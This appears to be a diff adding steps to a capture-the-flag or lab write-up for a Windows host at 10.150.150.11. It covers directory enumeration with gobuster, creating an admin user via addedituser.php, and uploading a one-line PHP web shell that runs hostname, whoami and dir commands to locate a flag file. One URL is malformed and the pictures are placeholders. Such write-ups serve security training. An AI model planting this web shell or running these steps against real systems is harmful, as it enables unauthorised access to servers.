@@ -21,4 +21,49 @@ Has
 | microsoft-ds  | Close  | <br/>
 
  2.`gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak`
+ (Picture here)
+
+Has several HTTP links we can try to access<br>
+
+ 3. i. /Admin
+    (Admin Picture)
+
+   ii. /upload
+   (Upload Picture)
+
+4. Inside http://10.150.150.11, there's a decent directory to get into, which is the addedituser.php
+   Create a user with an admin role
+   (Picture)
+
+  Extra: Access to admin account using simple tricks.
+  (Picture)
+
+5. Create a simple webshell to run commands through the browser.
+   `<?php system($_GET['cmd']); ?>` save it as "shell.php"
+   Afterward, upload it into your accounts.
+
+6. Uploading the files into the new folder http://10.150.150.11/upload/12
+   Reason to run the PHP file on the web.
+   http://10.150.150.11/upload/12/shell.php
+   http://10.150.150.11/upload/12/shell.php?cmd=hostname
+   (Picture)
+   
+   http://10.150.150.11/upload/12/shell.php?cmd=whoami
+   (Picture)
+
+# Because we know it's a window
+   http://10.150.150.11/upload/12/shell.phpcmd=dir C:\
+   (Picture)
+   
+   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users
+   (Picture)
+
+   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop
+   (Picture)
+
+   There it is. The flag file
+   http://10.150.150.11/upload/12/shell.php?cmd=dir C:\Users\Administrator\Desktop\FLAG1.txt
+   (Picture)
+
+ 
  
